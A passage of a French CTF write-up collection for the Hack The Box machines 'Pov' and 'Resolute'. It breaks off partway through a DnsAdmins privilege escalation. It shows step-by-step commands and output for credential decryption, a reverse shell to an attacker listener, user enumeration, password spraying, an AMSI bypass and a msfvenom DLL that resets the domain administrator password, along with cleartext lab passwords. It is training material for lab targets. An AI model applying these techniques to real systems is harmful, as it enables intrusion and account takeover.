9/15/2018  12:14 AM           3810 appcmd.xml\n-a----       10/26/2023   4:30 PM         181760 AppHostNavigators.dll\n-a----       10/26/2023   4:30 PM          80896 apphostsvc.dll\n-a----       10/26/2023   2:48 PM         406016 appobj.dll\n-a----       10/26/2023   4:29 PM         131072 aspnetca.exe\n-a----       10/26/2023   2:53 PM          39936 authanon.dll\n-a----       10/26/2023   2:53 PM          38400 authbas.dll\n-a----       10/26/2023   2:48 PM          24064 cachfile.dll\n-a----       10/26/2023   4:30 PM          53248 cachhttp.dll\n-a----       10/26/2023   2:53 PM          16896 cachtokn.dll\n-a----       10/26/2023   2:48 PM          14336 cachuri.dll\n-a----       10/26/2023   4:30 PM          54784 compstat.dll\n-a----       10/26/2023   4:30 PM          47104 custerr.dll\n-a----       10/26/2023   4:29 PM          20480 defdoc.dll\n-a----       10/26/2023   4:29 PM          24064 dirlist.dll\n-a----       10/26/2023   4:31 PM          68096 filter.dll\n-a----       10/26/2023   4:30 PM          38400 gzip.dll\n-a----       10/26/2023   4:29 PM          22016 httpmib.dll\n-a----       10/26/2023   2:48 PM          18432 hwebcore.dll\n-a----       10/26/2023   2:48 PM          63105 iis.msc\n-a----       10/26/2023   2:53 PM         307200 iiscore.dll\n-a----       10/26/2023   4:29 PM         110080 iisreg.dll\n-a----       10/26/2023   2:48 PM         231936 iisres.dll\n-a----       10/26/2023   4:29 PM          38400 iisrstas.exe\n-a----       10/26/2023   2:48 PM         192512 iissetup.exe\n-a----       10/26/2023   2:48 PM          57344 iissyspr.dll\n-a----       10/26/2023   4:29 PM          14848 iisual.exe\n-a----       10/26/2023   2:52 PM         285696 iisutil.dll\n-a----       10/26/2023   4:30 PM         614912 iisw3adm.dll\n-a----       10/26/2023   2:52 PM         125440 InetMgr.exe\n-a----       10/26/2023   2:53 PM         131072 isapi.dll\n-a----       10/26/2023   4:30 PM          36352 loghttp.dll\n-a----       10/26/2023   4:30 PM         147456 Microsoft.Web.Administration.dll\n-a----       10/26/2023   4:30 PM        1052672 Microsoft.Web.Management.dll\n-a----       10/26/2023   4:29 PM          44032 modrqflt.dll\n-a----       10/26/2023   2:52 PM         478720 nativerd.dll\n-a----       10/26/2023   4:30 PM          27136 protsup.dll\n-a----        1/11/2024   6:51 AM          21504 redirect.dll\n-a----       10/26/2023   2:48 PM          33792 rsca.dll\n-a----       10/26/2023   2:48 PM          51200 rscaext.dll\n-a----       10/26/2023   4:29 PM          40448 static.dll\n-a----       10/26/2023   4:29 PM         189952 uihelper.dll\n-a----       10/26/2023   4:31 PM          21504 validcfg.dll\n-a----       10/26/2023   2:48 PM          16384 w3ctrlps.dll\n-a----       10/26/2023   4:29 PM          29696 w3ctrs.dll\n-a----       10/26/2023   2:48 PM         109568 w3dt.dll\n-a----       10/26/2023   4:30 PM         101888 w3logsvc.dll\n-a----       10/26/2023   4:30 PM          29184 w3tp.dll\n-a----       10/26/2023   4:30 PM          26624 w3wp.exe\n-a----       10/26/2023   4:30 PM          78336 w3wphost.dll\n-a----       10/26/2023   4:30 PM          31744 wbhstipm.dll\n-a----       10/26/2023   4:30 PM          27648 wbhst_pm.dll\n-a----       10/26/2023   4:30 PM         169984 XPath.dll\n\n\nPS C:\\windows\\system32\\inetsrv&gt;\n</code></pre> <pre><code>PS C:\\windows\\system32\\inetsrv&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name SID\n========= =============================================\npov\\sfitz S-1-5-21-2506154456-4081221362-271687478-1000\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID                                                           Attributes\n====================================== ================ ============================================================= ==================================================\nEveryone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group\nBUILTIN\\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group\nLOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group\nIIS APPPOOL\\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192\n\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <p>En cherchant dans le dossier de l'utilisateur je trouve un .xml contenant potentiellement des creds. L'utilisation d'import-clixml permet alors de d\u00e9chiffrer le mot de passe de l'utilisateur alaading :</p> <pre><code>PS C:\\Users\\sfitz&gt; dir Documents\n\n\n    Directory: C:\\Users\\sfitz\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       12/25/2023   2:26 PM           1838 connection.xml\n\n\nPS C:\\Users\\sfitz&gt; type Documents\\connection.xml\n&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;\n  &lt;Obj RefId=\"0\"&gt;\n    &lt;TN RefId=\"0\"&gt;\n      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;\n      &lt;T&gt;System.Object&lt;/T&gt;\n    &lt;/TN&gt;\n    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;\n    &lt;Props&gt;\n      &lt;S N=\"UserName\"&gt;alaading&lt;/S&gt;\n      &lt;SS N=\"Password\"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;\n    &lt;/Props&gt;\n  &lt;/Obj&gt;\n&lt;/Objs&gt;\nPS C:\\Users\\sfitz&gt; $cred = Import-CliXml -Path Documents\\connection.xml; $cred.GetNetworkCredential() | Format-List *\n\n\nUserName       : alaading\nPassword       : f8gQ8fynP44ek1m3\nSecurePassword : System.Security.SecureString\nDomain         :\n</code></pre> <p>Utilisation de runascs pour lancer un autre reverse-shell :</p> <pre><code>PS C:\\Users\\sfitz\\Downloads&gt; .\\runascs.exe alaading f8gQ8fynP44ek1m3 -r 10.10.16.17:4444\n[-] Not enough arguments. 3 Arguments required. Use --help for additional help.\nPS C:\\Users\\sfitz\\Downloads&gt; .\\runascs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.17:4444\n\n[+] Running in session 0 with process function CreateProcessWithLogonW()\n[+] Using Station\\Desktop: Service-0x0-27216e$\\Default\n[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 4456 created in background.\n</code></pre> <pre><code>pak@laptop:~$ nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49678\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32&gt; whoami\nwhoami\npov\\alaading\nPS C:\\Windows\\system32&gt; whoami /all\nwhoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name    SID\n============ =============================================\npov\\alaading S-1-5-21-2506154456-4081221362-271687478-1001\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                           Type             SID          Attributes\n\n==================================== ================ ============ ==================================================\nEveryone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level Label            S-1-16-12288\n\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeDebugPrivilege              Debug programs                 Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n\nPS C:\\Windows\\system32&gt;\n</code></pre> <p>Le privil\u00e8ge SeDebug est actif, ce qui nous permet d'utiliser l'exploit habituel pour passer SYSTEM :) !</p>"},{"location":"Writeup/HTB/Machines/Resolute/","title":"Resolute","text":"Room Resolute Url https://app.hackthebox.com/machines/220 Sujets Windows/AD/ADCS Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Resolute/#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE      REASON  VERSION\n53/tcp    open  domain       syn-ack Simple DNS Plus\n88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-03-18 22:51:36Z)\n135/tcp   open  msrpc        syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)\n464/tcp   open  kpasswd5?    syn-ack\n593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped   syn-ack\n3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped   syn-ack\n5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf       syn-ack .NET Message Framing\n47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49665/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49666/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49667/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49671/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49686/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49706/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49750/tcp open  msrpc        syn-ack Microsoft Windows RPC\nService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>Enum\u00e9ration des utilisateurs :</p> <pre><code>pak@DESKTOP-AF1CU53:~$ Downloads/kerbrute_linux_amd64 userenum --dc 10.129.167.19 -d megabank.local /usr/share/wordlists/secl\nists/Usernames/xato-net-10-million-usernames.txt\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 03/18/24 - Ronnie Flathers @ropnop\n\n2024/03/18 23:49:16 &gt;  Using KDC(s):\n2024/03/18 23:49:16 &gt;   10.129.167.19:88\n\n2024/03/18 23:49:16 &gt;  [+] VALID USERNAME:       steve@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       fred@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       marcus@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       simon@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       ryan@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       stevie@megabank.local\n2024/03/18 23:49:18 &gt;  [+] VALID USERNAME:       angela@megabank.local\n2024/03/18 23:49:19 &gt;  [+] VALID USERNAME:       Steve@megabank.local\n2024/03/18 23:49:20 &gt;  [+] VALID USERNAME:       claire@megabank.local\n2024/03/18 23:49:21 &gt;  [+] VALID USERNAME:       sally@megabank.local\n2024/03/18 23:49:22 &gt;  [+] VALID USERNAME:       claude@megabank.local\n2024/03/18 23:49:24 &gt;  [+] VALID USERNAME:       melanie@megabank.local\n2024/03/18 23:49:25 &gt;  [+] VALID USERNAME:       administrator@megabank.local\n2024/03/18 23:49:26 &gt;  [+] VALID USERNAME:       gustavo@megabank.local\n2024/03/18 23:49:27 &gt;  [+] VALID USERNAME:       STEVE@megabank.local\n2024/03/18 23:49:28 &gt;  [+] VALID USERNAME:       marko@megabank.local\n2024/03/18 23:49:29 &gt;  [+] VALID USERNAME:       Marcus@megabank.local\n2024/03/18 23:49:33 &gt;  [+] VALID USERNAME:       Angela@megabank.local\n2024/03/18 23:49:35 &gt;  [+] VALID USERNAME:       Ryan@megabank.local\n2024/03/18 23:49:35 &gt;  [+] VALID USERNAME:       Fred@megabank.local\n2024/03/18 23:49:36 &gt;  [+] VALID USERNAME:       paulo@megabank.local\n2024/03/18 23:49:38 &gt;  [+] VALID USERNAME:       felicia@megabank.local\n2024/03/18 23:49:39 &gt;  [+] VALID USERNAME:       annette@megabank.local\n2024/03/18 23:49:39 &gt;  [+] VALID USERNAME:       abigail@megabank.local\n2024/03/18 23:49:42 &gt;  [+] VALID USERNAME:       Stevie@megabank.local\n2024/03/18 23:49:42 &gt;  [+] VALID USERNAME:       FRED@megabank.local\n2024/03/18 23:49:44 &gt;  [+] VALID USERNAME:       Simon@megabank.local\n2024/03/18 23:49:53 &gt;  [+] VALID USERNAME:       Annette@megabank.local\n2024/03/18 23:50:05 &gt;  [+] VALID USERNAME:       annika@megabank.local\n2024/03/18 23:50:06 &gt;  [+] VALID USERNAME:       Claude@megabank.local\n2024/03/18 23:50:19 &gt;  [+] VALID USERNAME:       per@megabank.local\n2024/03/18 23:50:23 &gt;  [+] VALID USERNAME:       Administrator@megabank.local\n2024/03/18 23:50:35 &gt;  [+] VALID USERNAME:       Sally@megabank.local\n2024/03/18 23:50:36 &gt;  [+] VALID USERNAME:       MARCUS@megabank.local\n2024/03/18 23:50:45 &gt;  [+] VALID USERNAME:       Claire@megabank.local\n2024/03/18 23:50:45 &gt;  [+] VALID USERNAME:       ANGELA@megabank.local\n2024/03/18 23:50:48 &gt;  [+] VALID USERNAME:       naoki@megabank.local\n2024/03/18 23:50:55 &gt;  [+] VALID USERNAME:       Melanie@megabank.local\n2024/03/18 23:50:55 &gt;  [+] VALID USERNAME:       Marko@megabank.local\n2024/03/18 23:51:07 &gt;  [+] VALID USERNAME:       SIMON@megabank.local\n2024/03/18 23:51:09 &gt;  [+] VALID USERNAME:       zach@megabank.local\n2024/03/18 23:51:44 &gt;  [+] VALID USERNAME:       Paulo@megabank.local\n2024/03/18 23:51:45 &gt;  [+] VALID USERNAME:       CLAUDE@megabank.local\n2024/03/18 23:52:11 &gt;  [+] VALID USERNAME:       Felicia@megabank.local\n2024/03/18 23:52:15 &gt;  [+] VALID USERNAME:       ulf@megabank.local\n2024/03/18 23:52:44 &gt;  [+] VALID USERNAME:       RYAN@megabank.local\n2024/03/18 23:53:39 &gt;  [+] VALID USERNAME:       MELANIE@megabank.local\n2024/03/18 23:53:40 &gt;  [+] VALID USERNAME:       Gustavo@megabank.local\n2024/03/18 23:54:01 &gt;  [+] VALID USERNAME:       resolute@megabank.local\n2024/03/18 23:55:08 &gt;  [+] VALID USERNAME:       ANNETTE@megabank.local\n2024/03/18 23:57:11 &gt;  [+] VALID USERNAME:       STEVIE@megabank.local\n2024/03/18 23:57:13 &gt;  [+] VALID USERNAME:       PAULO@megabank.local\n2024/03/18 23:57:15 &gt;  [+] VALID USERNAME:       MARKO@megabank.local\n2024/03/18 23:57:18 &gt;  [+] VALID USERNAME:       GUSTAVO@megabank.local\n2024/03/18 23:57:21 &gt;  [+] VALID USERNAME:       CLAIRE@megabank.local\n2024/03/18 23:57:23 &gt;  [+] VALID USERNAME:       Annika@megabank.local\n2024/03/19 00:03:22 &gt;  [+] VALID USERNAME:       Ulf@megabank.local\n</code></pre> <p>J'ai ensuite tent\u00e9 de voir si certains des utilisateurs n'\u00e9taient pas asreproastables :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -dc-ip 10.129.167.19 -usersfile users.txt megabank.local/\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User resolute doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] invalid principal syntax\n</code></pre> <p>Rien :). Samba ne donne rien non plus. Je tente alors une \u00e9num\u00e9ration du LDAP :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ netexec ldap 10.129.167.19 -u \"\" -p \"\" -M get-desc-users\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nLDAP        10.129.167.19   389    RESOLUTE         [+] megabank.local\\:\nGET-DESC... 10.129.167.19   389    RESOLUTE         [+] Found following users:\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: Administrator description: Built-in account for administering the computer/domain\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: Guest description: Built-in account for guest access to the computer/domain\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: DefaultAccount description: A user account managed by the system.\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: krbtgt description: Key Distribution Center Service Account\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: marko description: Account created. Password set to Welcome123!\n</code></pre> <p>On a un utilisateur et un pass ! On confirme la connexion :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u marko -p 'Welcome123!'\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\marko:Welcome123! STATUS_LOGON_FAILURE\n</code></pre> <p>Et... le pass ne fonctionne pas. Comme il est dit que c'est le password utilis\u00e9 \u00e0 la cr\u00e9ation d'un compte, je tente donc un password-spraying sur ma liste d'utilisateur:</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u users.txt -p 'Welcome123!'\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\steve:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\fred:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\marcus:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\simon:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\ryan:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\stevie:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\angela:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\claire:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\claude:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\\melanie:Welcome123!\n</code></pre> <p>Et l\u00e0 on a un truc. Et m\u00eame une connexion via WinRM :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.129.167.19 -u melanie -p 'Welcome123!'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt;\n</code></pre> <p>L'utilisateur ne semble pas avoir de droits particuliers :</p> <pre><code>*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name        SID\n================ ===============================================\nmegabank\\melanie S-1-5-21-1392959593-3013219662-3596683436-10101\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ==================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level     Label            S-1-16-8192\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>Winpeas n'a rien donn\u00e9 de particulier, on lance alors adpeas qui servira ensuite \u00e0 alimenter notre bloodhound :</p> <pre><code>*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; Bypass-4MSI\n\nInfo: Patching 4MSI, please be patient...\n\n[+] Success!\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; dir\n\n\n    Directory: C:\\Users\\melanie\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        3/18/2024   4:34 PM        3119779 adPEAS.ps1\n-a----        3/18/2024   4:27 PM        2234368 winPEASx64_ofs.exe\n\n\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; Import-Module .\\adPEAS.ps1\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; Invoke-adpeas\n</code></pre> <p>Bloodhound ne donne rien de particulier... Je chercher alors quelques trucs \u00e0 la main.</p> <pre><code>*Evil-WinRM* PS C:\\&gt; dir -force\n\n    Directory: C:\\\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--hs-        3/18/2024   4:29 PM                $RECYCLE.BIN\nd--hsl        9/25/2019  10:17 AM                Documents and Settings\nd-----        9/25/2019   6:19 AM                PerfLogs\nd-r---        9/25/2019  12:39 PM                Program Files\nd-----       11/20/2016   6:36 PM                Program Files (x86)\nd--h--        9/25/2019  10:48 AM                ProgramData\nd--h--        12/3/2019   6:32 AM                PSTranscripts\nd--hs-        9/25/2019  10:17 AM                Recovery\nd--hs-        9/25/2019   6:25 AM                System Volume Information\nd-r---        12/4/2019   2:46 AM                Users\nd-----        12/4/2019   5:15 AM                Windows\n-arhs-       11/20/2016   5:59 PM         389408 bootmgr\n-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT\n-a-hs-        3/18/2024   3:48 PM      402653184 pagefile.sys\n\n\n*Evil-WinRM* PS C:\\&gt; cd PSTranscripts\n*Evil-WinRM* PS C:\\PSTranscripts&gt; dir\n*Evil-WinRM* PS C:\\PSTranscripts&gt; dir -force\n\n\n    Directory: C:\\PSTranscripts\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--h--        12/3/2019   6:45 AM                20191203\n\n\n*Evil-WinRM* PS C:\\PSTranscripts&gt; cd 20191203\n*Evil-WinRM* PS C:\\PSTranscripts\\20191203&gt; dir -force\n\n\n    Directory: C:\\PSTranscripts\\20191203\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt\n</code></pre> <p>\u00e0 l'int\u00e9rieur de ce .txt :</p> <pre><code>&gt;&gt; ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!\n</code></pre> <p>Le pass fonctionne :</p> <pre><code>pak@DESKTOP-AF1CU53:~$ netexec smb 10.129.167.19 -u ryan -p 'Serv3r4Admin4cc123!'\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\\ryan:Serv3r4Admin4cc123! (Pwn3d!)\n</code></pre> <p></p> <p>L'utilisateur fait parti du groupe \"dnsadmins\" : il peut s'agir d'un vecteur de privesc vers l'utilisateur admin.</p> <pre><code>pak@DESKTOP-AF1CU53:~$ msfvenom -p windows/x64/exec cmd='net user administrator pakpak123! /domain' -f dll -o adduser.dll\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 309 bytes\nFinal size of dll file: 9216 bytes\nSaved as: adduser.dll\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; upload /home/pak/adduser.dll\n\nInfo: Uploading /home/pak/adduser.dll to C:\\Users\\ryan\\Documents\\adduser.dll\n\nData: 12288 bytes of 12288 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; dir\n\n\n    Directory: C:\\Users\\ryan\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        3/18/2024   5:01 PM              0 adduser.dll\n-a----        3/18/2024   4:58 PM              5 start\n-a----        3/18/2024   4:58 PM              5 stop\n\n\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; dnscmd.exe /config 